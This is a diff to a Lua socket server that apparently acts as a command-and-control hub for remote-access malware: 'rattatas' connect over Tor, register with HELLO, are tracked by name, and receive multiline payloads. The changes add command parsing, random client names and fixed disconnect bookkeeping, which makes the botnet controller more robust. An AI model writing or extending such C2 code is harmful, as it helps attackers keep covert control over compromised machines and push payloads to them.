@@ -18,6 +18,32 @@ local eggs = {}
 -- list of current rattatas
 local rattatas = {}
 
+-- seperate command from args
+function get_command(line)
+  local cmd = nil
+  local args = {}
+  for token in string.gmatch(line, "[^%s]+") do
+    if cmd == nil then
+      cmd = token:upper()
+    else
+      table.insert(args, token)
+    end
+  end
+  return cmd, args
+end
+
+math.randomseed(os.clock()^5)
+
+-- get a random string
+function random_string(length)
+  local res = ""
+  for i = 1, length do
+    res = res .. string.char(math.random(97, 122))
+  end
+  return res
+end
+
+
 -- called whenever a rattata connects over tor
 function rattata_handler(skt)
   print("rattata connected")
@@ -25,7 +51,7 @@ function rattata_handler(skt)
   local payload = ""
   while true do
     if buffer == nil then
-      local command = copas.receive(skt)
+      local command, args = get_command(copas.receive(skt))
       print("command: " .. command)
       
       -- start a multiline payload
@@ -36,14 +62,15 @@ function rattata_handler(skt)
       -- say "hi" to add to rattatas list
       elseif command == "HELLO" then
         -- next line is name
-        local name = copas.receive(skt)
+        local name = args[1] or random_string(8)
         rattatas[name] = skt
+	skt.rattata = name
         copas.send(skt, "HI " .. name)
       
       -- disconnect
       elseif command == "QUIT" then
         skt:close()
-        rattatas[name] = nil
+        rattatas[skt.rattata] = nil
         break
       end
     else -- handle multiline-payload
